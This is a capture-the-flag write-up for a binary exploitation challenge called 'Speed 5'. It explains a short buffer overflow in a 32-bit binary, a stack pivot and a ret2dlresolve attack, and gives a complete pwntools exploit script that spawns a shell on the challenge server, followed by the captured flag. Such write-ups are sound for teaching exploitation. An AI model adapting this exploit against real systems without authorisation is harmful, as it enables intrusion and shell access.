# Speed 5

## Challenge

We are given a small binary with no PIE, no canary, and partial RELRO.

The binary contains little more than a single call to `read`.

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution

The call to `read` is vulnerable to a buffer overflow, as it reads more characters than the buffer can safely store.
The overflow is quite short, so we first need to create room for a larger ropchain.

The program first enters the `go` function from `main`.
The `go` function is the one that contains the call to `read`.
The use of an additional function here allows us to pivot our stack onto the data section of the binary.

By pivoting the stack, we now know our stack address, which allows us to extend our ropchain using a second call to `read`.
From here, we can use a ret2dlresolve attack to call `system("/bin/sh")` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host speed-05.hfsc.tf --port 22345 speed5
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('speed5')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'speed-05.hfsc.tf'
port = int(args.PORT or 22345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
rop2 = ROP(exe)
rop2.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop2.ret2dlresolve(dlresolve)
io.info(hex(dlresolve.data_addr))

new_base = 0x804c800 
rop1 = ROP(exe)
rop1.read(0, new_base, len(rop2.chain()))
rop1.raw(rop1.find_gadget(['leave', 'ret'])[0])

print(rop1.dump())
print(rop2.dump())

io.send(flat({
    0x18: new_base - 4,
    0x18+4: [
        exe.plt['read'],
        rop1.find_gadget(['leave', 'ret'])[0],
        0,
        new_base,
        len(rop2.chain()),
        ],
    0x30: [
        rop2.chain(),
        dlresolve.payload,
        ],
    }))

io.interactive()
```

## Flag

```
midnight{1d5be118261b067c0af4cff137d48d60}
```
